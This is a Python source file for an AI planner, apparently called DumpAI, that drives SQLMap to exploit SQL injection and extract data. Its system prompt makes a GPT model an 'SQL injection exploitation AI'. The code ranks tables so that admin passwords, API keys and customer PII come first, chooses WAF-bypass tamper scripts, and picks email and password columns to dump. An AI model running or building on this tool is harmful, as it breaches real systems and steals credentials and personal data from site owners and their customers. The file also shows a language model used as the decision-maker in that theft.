"""
DumpAI Planner - Central AI Brain for Decision Making

Implements the Reason → Act → Observe pattern from hackingBuddyGPT.
The Planner analyzes context and decides next actions at every stage.
"""
import json
import os
import requests
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from enum import Enum


OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY")
OPENAI_MODEL = os.environ.get("DUMPAI_MODEL", "gpt-4o-mini")


class ActionType(Enum):
    """Types of actions the agent can take."""
    ENUMERATE_DBS = "enumerate_dbs"
    ENUMERATE_TABLES = "enumerate_tables"
    SEARCH_TABLES = "search_tables"
    GET_COLUMNS = "get_columns"
    SEARCH_COLUMNS = "search_columns"
    DUMP_TABLE = "dump_table"
    DUMP_COLUMNS = "dump_columns"
    CHANGE_STRATEGY = "change_strategy"
    RETRY_WITH_TAMPER = "retry_with_tamper"
    SKIP_TABLE = "skip_table"
    COMPLETE = "complete"
    ABORT = "abort"


@dataclass
class Observation:
    """Result of an action with parsed insights."""
    action: str
    success: bool
    raw_output: str = ""
    data: Any = None
    error: str = ""
    execution_time: float = 0.0
    insights: Dict = field(default_factory=dict)
    
    def to_context(self) -> str:
        """Convert to context string for AI."""
        status = "SUCCESS" if self.success else f"FAILED: {self.error}"
        context = f"Action: {self.action} -> {status}"
        
        if self.insights:
            for key, value in self.insights.items():
                context += f"\n  {key}: {value}"
        
        if self.data:
            if isinstance(self.data, list):
                context += f"\n  Data: {len(self.data)} items"
            else:
                context += f"\n  Data: {type(self.data).__name__}"
        
        return context


@dataclass
class Decision:
    """AI decision with reasoning."""
    action: ActionType
    params: Dict = field(default_factory=dict)
    reasoning: str = ""
    confidence: float = 0.0
    alternatives: List[str] = field(default_factory=list)


class Planner:
    """
    Central AI Planner - makes intelligent decisions at every stage.
    
    Unlike static scripts, the Planner:
    1. Analyzes SQLMap output patterns in real-time
    2. Adapts strategy based on errors/timeouts
    3. Prioritizes tables dynamically by utility score
    4. Decides when to use Smart Search vs full enumeration
    5. Selects tamper scripts based on WAF detection
    6. Learns from each action's result
    """
    
    SYSTEM_PROMPT = """You are an expert SQL injection exploitation AI for penetration testing.
You analyze SQLMap output and make intelligent decisions about next steps.

Your role:
1. Analyze injection type and select optimal strategy
2. Detect CMS and prioritize high-value tables
3. Adapt when errors/timeouts occur (suggest tampers, different techniques)
4. Decide what data to extract based on categories requested
5. Know when to use Smart Search (blind/time-based) vs full enumeration

CRITICAL RULES:
- Always respond with valid JSON
- Consider injection speed when planning (time-based = slow = minimal queries)
- Adapt to errors: WAF detected -> suggest tampers, timeouts -> increase --time-sec
- Prioritize tables with credentials/API keys over generic data

AVAILABLE ACTIONS:
- enumerate_dbs: Get list of databases
- enumerate_tables: Get all tables in database  
- search_tables: Search tables by pattern (faster for blind)
- get_columns: Get columns for specific table
- search_columns: Search columns by pattern
- dump_table: Dump entire table
- dump_columns: Dump specific columns from table
- change_strategy: Switch approach (e.g., to Smart Search)
- retry_with_tamper: Retry with WAF bypass tamper script
- skip_table: Skip problematic table
- complete: Mission accomplished
- abort: Critical failure, cannot proceed"""
    
    def __init__(self, verbosity: int = 0, max_tokens: int = 2000):
        self.verbosity = verbosity
        self.max_tokens = max_tokens
        self.history: List[Tuple[str, str]] = []  # (prompt, response)
        self.total_tokens = 0
        self.call_count = 0
    
    def _call_llm(self, prompt: str, system_override: str = None) -> Dict:
        """Call OpenAI API with structured output."""
        if not OPENAI_API_KEY:
            if self.verbosity >= 1:
                print("[!] No OPENAI_API_KEY - using fallback logic")
            return {}
        
        try:
            response = requests.post(
                "https://api.openai.com/v1/chat/completions",
                headers={
                    "Authorization": f"Bearer {OPENAI_API_KEY}",
                    "Content-Type": "application/json"
                },
                json={
                    "model": OPENAI_MODEL,
                    "messages": [
                        {"role": "system", "content": system_override or self.SYSTEM_PROMPT},
                        {"role": "user", "content": prompt}
                    ],
                    "temperature": 0.2,
                    "max_tokens": self.max_tokens,
                    "response_format": {"type": "json_object"}
                },
                timeout=90
            )
            
            if response.status_code == 200:
                data = response.json()
                content = data["choices"][0]["message"]["content"]
                
                usage = data.get("usage", {})
                self.total_tokens += usage.get("total_tokens", 0)
                self.call_count += 1
                
                self.history.append((prompt[:500], content[:500]))
                
                return json.loads(content)
            else:
                if self.verbosity >= 1:
                    print(f"[!] API error: {response.status_code}")
                return {}
                
        except Exception as e:
            if self.verbosity >= 1:
                print(f"[!] LLM call failed: {e}")
            return {}
    
    def analyze_injection(self, sqlmap_output: Optional[str] = None) -> Dict:
        """
        Analyze SQLMap output to detect injection type and characteristics.
        
        Returns:
            {
                "injection_type": "time_based|boolean_blind|error_based|union|stacked",
                "is_slow": true/false,
                "dbms": "mysql|postgresql|mssql|oracle|sqlite",
                "waf_detected": true/false,
                "recommended_strategy": "smart_search|full_enumeration",
                "tampers_suggested": ["space2comment", "between"],
                "reasoning": "Why this analysis..."
            }
        """
        if not sqlmap_output:
            return self._fallback_injection_analysis("")
        
        prompt = f"""Analyze this SQLMap output and determine injection characteristics:

```
{sqlmap_output[-4000:]}
```

Analyze and respond with JSON:
{{
    "injection_type": "type from output",
    "is_slow": false if UNION/error-based/stacked present (these are FAST), true ONLY if ONLY blind/time-based,
    "dbms": "detected DBMS",
    "waf_detected": true if WAF/IPS indicators,
    "recommended_strategy": "full_enumeration if UNION/error/stacked available, smart_search ONLY for pure blind",
    "tampers_suggested": ["list", "of", "tampers"] if WAF detected,
    "speed_estimate": "fast if UNION/error/stacked, slow if only blind/time-based",
    "available_techniques": "SQLMap codes for detected techniques ordered fast-to-slow: U=Union, E=Error, S=Stacked, B=Boolean, T=Time (e.g. 'UEBT' if all except stacked)",
    "reasoning": "brief explanation"
}}"""

        result = self._call_llm(prompt)
        
        if not result:
            result = self._fallback_injection_analysis(sqlmap_output)
        else:
            # Ensure available_techniques is always present by parsing from output if LLM didn't provide it
            if not result.get("available_techniques"):
                fallback = self._fallback_injection_analysis(sqlmap_output)
                result["available_techniques"] = fallback.get("available_techniques", "")
        
        if self.verbosity >= 1 and result:
            print(f"[AI] Injection: {result.get('injection_type', '?')} ({result.get('speed_estimate', '?')})")
            if result.get('waf_detected'):
                print(f"[AI] WAF detected! Suggested tampers: {result.get('tampers_suggested', [])}")
        
        return result
    
    def _fallback_injection_analysis(self, output: str) -> Dict:
        """Fallback pattern-based injection analysis."""
        output_lower = output.lower()
        
        # Detect ALL available injection types
        types_found = []
        if "union" in output_lower:
            types_found.append("union")
        if "error-based" in output_lower:
            types_found.append("error_based")
        if "stacked queries" in output_lower:
            types_found.append("stacked")
        if "boolean-based blind" in output_lower:
            types_found.append("boolean_blind")
        if "time-based blind" in output_lower:
            types_found.append("time_based")
        
        # Determine injection_type (prefer fastest)
        if "union" in types_found:
            injection_type = "union"
        elif "error_based" in types_found:
            injection_type = "error_based"
        elif "stacked" in types_found:
            injection_type = "stacked"
        elif "boolean_blind" in types_found:
            injection_type = "boolean_blind"
        elif "time_based" in types_found:
            injection_type = "time_based"
        else:
            injection_type = "unknown"
        
        # FAST techniques: union, error-based, stacked
        # SLOW techniques: boolean-blind, time-based (only if no fast available)
        fast_techniques = {"union", "error_based", "stacked"}
        has_fast = bool(fast_techniques & set(types_found))
        is_slow = not has_fast and len(types_found) > 0
        
        waf_detected = any(x in output_lower for x in [
            "waf/ips", "web application firewall", "blocked",
            "forbidden", "access denied", "mod_security"
        ])
        
        # Convert types_found to SQLMap technique codes
        technique_map = {
            "union": "U",
            "error_based": "E", 
            "stacked": "S",
            "boolean_blind": "B",
            "time_based": "T"
        }
        # Build techniques string ordered by speed (fast first)
        priority_order = ["union", "error_based", "stacked", "boolean_blind", "time_based"]
        available_techniques = "".join(technique_map[t] for t in priority_order if t in types_found)
        
        return {
            "injection_type": injection_type,
            "is_slow": is_slow,
            "dbms": "mysql",
            "waf_detected": waf_detected,
            "recommended_strategy": "smart_search" if is_slow else "full_enumeration",
            "tampers_suggested": ["space2comment", "between"] if waf_detected else [],
            "speed_estimate": "slow" if is_slow else "fast",
            "reasoning": "Fallback pattern matching",
            "available_techniques": available_techniques
        }
    
    def prioritize_tables(self, tables: List[str], categories: List[str],
                          cms_detected: str = "", context: str = "") -> List[Dict]:
        """
        Use AI to prioritize tables by utility score.
        
        Returns list of tables with scores:
        [
            {"table": "ps_employee", "score": 0.95, "category": "user_data", "reason": "Admin accounts"},
            {"table": "ps_customer", "score": 0.7, "category": "customer_data", "reason": "Customer PII"},
            ...
        ]
        """
        prompt = f"""Prioritize these database tables for extraction.

CMS: {cms_detected or 'Unknown'}
CATEGORIES REQUESTED: {', '.join(categories)}
TABLES: {', '.join(tables[:50])}

CONTEXT:
{context}

CRITICAL: Only return tables that match the CATEGORIES REQUESTED.
Category definitions:
- user_data: employee/admin/staff accounts (NOT customer accounts)
- customer_data: customer/client personal info, addresses, orders
- api_key: API keys, tokens, credentials, webservice accounts
- sys_data: configuration, settings, connections
- email_pass: email + password combinations

IMPORTANT:
- Tables with "address", "customer", "client", "order" belong to customer_data category ONLY
- Do NOT include customer_data tables unless "customer_data" is in CATEGORIES REQUESTED
- Do NOT include address tables unless "customer_data" is in CATEGORIES REQUESTED

Score each relevant table from 0.0 to 1.0 based on:
- 1.0: Critical (admin passwords, API keys)
- 0.8+: High (employee accounts, system config)
- 0.5+: Medium (customer data, orders)
- <0.5: Low (logs, cache, stats)

Respond with JSON:
{{
    "prioritized_tables": [
        {{"table": "name", "score": 0.95, "category": "must be one of {', '.join(categories)}", "reason": "why valuable", "columns_hint": ["suggested", "columns"]}}
    ],
    "cms_confidence": 0.0-1.0,
    "total_valuable_tables": N
}}

Only include tables that match requested categories. Sort by score descending."""

        result = self._call_llm(prompt)
        
        if result and "prioritized_tables" in result:
            tables_list = result["prioritized_tables"]
            if self.verbosity >= 1:
                print(f"[AI] Prioritized {len(tables_list)} tables")
                for t in tables_list[:5]:
                    print(f"     {t['score']:.2f} {t['table']}: {t['reason']}")
            return tables_list
        
        return self._fallback_table_prioritization(tables, categories)
    
    def _fallback_table_prioritization(self, tables: List[str], 
                                        categories: List[str]) -> List[Dict]:
        """Fallback pattern-based prioritization with strict category matching."""
        patterns = {
            "user_data": (["employee", "admin", "staff", "admin_user", "user", "users", "account", "login"], 0.9),
            "api_key": (["webservice", "api_key", "token", "oauth", "credential", "webservice_account", "api"], 0.95),
            "sys_data": (["config", "setting", "connection", "server", "configuration", "option"], 0.8),
            "customer_data": (["customer", "client", "address", "order", "cart"], 0.6),
            "email_pass": (["employee", "admin_user", "users", "user", "member", "account"], 0.85)
        }
        
        customer_only_patterns = ["customer", "client", "address", "order", "cart", "wishlist"]
        
        results = []
        seen_tables = set()
        
        for table in tables:
            table_lower = table.lower()
            
            is_customer_table = any(p in table_lower for p in customer_only_patterns)
            
            for cat in categories:
                if cat in patterns:
                    if is_customer_table and cat != "customer_data":
                        continue
                    
                    keywords, base_score = patterns[cat]
                    for kw in keywords:
                        if kw in table_lower and table not in seen_tables:
                            results.append({
                                "table": table,
                                "score": base_score,
                                "category": cat,
                                "reason": f"Pattern match: {kw}",
                                "columns_hint": []
                            })
                            seen_tables.add(table)
                            break
        
        results.sort(key=lambda x: x["score"], reverse=True)
        return results
    
    def decide_next_action(self, memory_context: str, 
                           last_observation: Optional[Observation] = None,
                           phase: str = "discovery") -> Decision:
        """
        Core decision function - decides what to do next based on context.
        
        This is the heart of the AI agent - called after every action
        to determine the next step.
        
        Args:
            memory_context: Compressed context from Memory.get_context_for_ai()
            last_observation: Result of the previous action (None for first round)
            phase: Current phase (discovery, extraction, completion)
        
        Returns:
            Decision with action type, params, and reasoning
        """
        obs_context = ""
        if last_observation is not None:
            obs_context = f"\n\nLAST ACTION RESULT:\n{last_observation.to_context()}"
        
        prompt = f"""You are controlling a SQL injection data extraction agent.
Decide the next action based on current state.

CURRENT PHASE: {phase}
{memory_context}
{obs_context}

Based on the current state, decide the next action.

DECISION RULES:
1. If no database selected -> enumerate_dbs
2. If no tables known -> enumerate_tables or search_tables (for slow injection)
3. If high-value tables found -> get_columns then dump_columns
4. If error occurred -> retry_with_tamper or skip_table
5. If all targets extracted -> complete
6. If critical failure -> abort

Respond with JSON:
{{
    "action": "action_name",
    "params": {{"key": "value"}},
    "reasoning": "Why this action",
    "confidence": 0.0-1.0,
    "alternatives": ["other", "options"]
}}"""

        result = self._call_llm(prompt)
        
        if result and "action" in result:
            try:
                action_type = ActionType(result["action"])
            except ValueError:
                action_type = ActionType.ENUMERATE_DBS
            
            return Decision(
                action=action_type,
                params=result.get("params", {}),
                reasoning=result.get("reasoning", ""),
                confidence=result.get("confidence", 0.5),
                alternatives=result.get("alternatives", [])
            )
        
        return self._fallback_decision(phase, last_observation)
    
    def _fallback_decision(self, phase: str, 
                           last_observation: Optional[Observation] = None) -> Decision:
        """Fallback decision logic."""
        if phase == "discovery":
            return Decision(
                action=ActionType.ENUMERATE_DBS,
                reasoning="Fallback: Start with database enumeration",
                confidence=0.5
            )
        elif phase == "tables":
            return Decision(
                action=ActionType.ENUMERATE_TABLES,
                reasoning="Fallback: Enumerate all tables",
                confidence=0.5
            )
        elif phase == "extraction":
            return Decision(
                action=ActionType.GET_COLUMNS,
                reasoning="Fallback: Get columns for extraction",
                confidence=0.5
            )
        else:
            return Decision(
                action=ActionType.COMPLETE,
                reasoning="Fallback: Mark as complete",
                confidence=0.3
            )
    
    def adapt_to_error(self, error: str, context: str, 
                       failed_action: str) -> Dict:
        """
        Analyze error and suggest adaptation strategy.
        
        This is called when an action fails - the AI decides how to recover.
        
        Returns:
            {
                "should_retry": true/false,
                "new_params": {...} if retry with modifications,
                "tamper_script": "name" if WAF bypass needed,
                "skip_reason": "why" if should skip,
                "alternative_action": "action_name"
            }
        """
        # FAST LOCAL PARSING first - before calling LLM
        full_output = f"{error} {context}".lower()
        
        # Pattern: "unable to retrieve column names" + "common column existence check"
        if "unable to retrieve" in full_output and "column" in full_output:
            if self.verbosity >= 1:
                print("[PARSE] Detected: column enumeration failed, suggest --common-columns")
            return {
                "should_retry": True,
                "new_params": {"add_flags": "--common-columns"},
                "reasoning": "Column enumeration failed, retry with common column bruteforce"
            }
        
        # Pattern: WAF/IPS detected
        if any(w in full_output for w in ["waf", "blocked", "forbidden", "403", "firewall", "ips"]):
            if self.verbosity >= 1:
                print("[PARSE] Detected: WAF/IPS blocking")
            return {
                "should_retry": True,
                "tamper_script": "randomcase,space2comment",
                "reasoning": "WAF detected, retry with tamper scripts"
            }
        
        # Pattern: Timeout / slow connection
        if any(w in full_output for w in ["timed out", "timeout", "connection reset"]):
            if self.verbosity >= 1:
                print("[PARSE] Detected: timeout, increase delay")
            return {
                "should_retry": True,
                "new_params": {"add_flags": "--time-sec=30 --delay=3"},
                "reasoning": "Timeout detected, retry with longer delays"
            }
        
        # Pattern: Multi-threading unsafe warning
        if "multi-threading is considered unsafe" in full_output:
            if self.verbosity >= 1:
                print("[PARSE] Detected: threading warning, force threads=1")
            return {
                "should_retry": True,
                "new_params": {"threads_override": "1"},
                "reasoning": "Threading unsafe for time-based, retry with threads=1"
            }
        
        # Pattern: Table/column not found - skip
        if "table" in full_output and "not found" in full_output:
            return {
                "should_retry": False,
                "skip_reason": "Table not found in database"
            }
        
        # No local match - ask LLM for complex cases
        prompt = f"""A SQL injection action failed. Analyze and suggest recovery.

FAILED ACTION: {failed_action}
ERROR: {error}

CONTEXT:
{context}

Common error patterns and solutions:
- "connection timed out" -> increase --time-sec, try --threads=1
- "WAF" / "blocked" / "forbidden" -> use tamper script
- "no output" with blind injection -> try --technique=T
- "table not found" -> skip this table
- "too many requests" -> add --delay

Respond with JSON:
{{
    "should_retry": true/false,
    "new_params": {{"param": "value"}} if different params needed,
    "tamper_script": "script_name" if WAF detected,
    "technique_override": "T/B/E/U" if different technique,
    "skip_reason": "reason" if should skip,
    "alternative_action": "action_name" if different approach,
    "reasoning": "explanation"
}}"""

        result = self._call_llm(prompt)
        
        if self.verbosity >= 1 and result:
            if result.get("should_retry"):
                print(f"[AI] Retry strategy: {result.get('reasoning', '')}")
            else:
                print(f"[AI] Skip: {result.get('skip_reason', 'unknown')}")
        
        return result or {"should_retry": False, "skip_reason": "AI unavailable"}
    
    def select_extraction_columns(self, table: str, columns: List[str],
                                   categories: List[str], 
                                   context: str = "") -> Dict:
        """
        Use AI to select which columns to extract from a table.
        
        Returns:
            {
                "extractions": [
                    {"columns": ["email", "passwd"], "category": "email_pass", "priority": "high"},
                    ...
                ],
                "skip_columns": ["id", "date_add"],
                "reasoning": "..."
            }
        """
        prompt = f"""Select columns to extract from this table.

TABLE: {table}
COLUMNS: {', '.join(columns)}
CATEGORIES: {', '.join(categories)}

CONTEXT:
{context}

COLUMN PATTERNS:
- email_pass: email/mail + password/passwd/hash
- user_data: login/username + password + privileges
- api_key: api_key/token/secret/key
- sys_data: host/server/connection + user + password
- customer_data: name + email + phone + address

Respond with JSON:
{{
    "extractions": [
        {{"columns": ["col1", "col2"], "category": "category", "priority": "high|medium|low"}}
    ],
    "skip_columns": ["columns", "to", "skip"],
    "reasoning": "why these columns"
}}"""

        result = self._call_llm(prompt)
        
        if self.verbosity >= 1 and result:
            exts = result.get("extractions", [])
            if exts:
                for ext in exts[:3]:
                    print(f"[AI] Extract {ext['columns']} for {ext['category']}")
        
        return result or {"extractions": [], "skip_columns": [], "reasoning": "AI unavailable"}
    
    def get_stats(self) -> Dict:
        """Get planner statistics."""
        return {
            "ai_calls": self.call_count,
            "total_tokens": self.total_tokens,
            "history_length": len(self.history)
        }
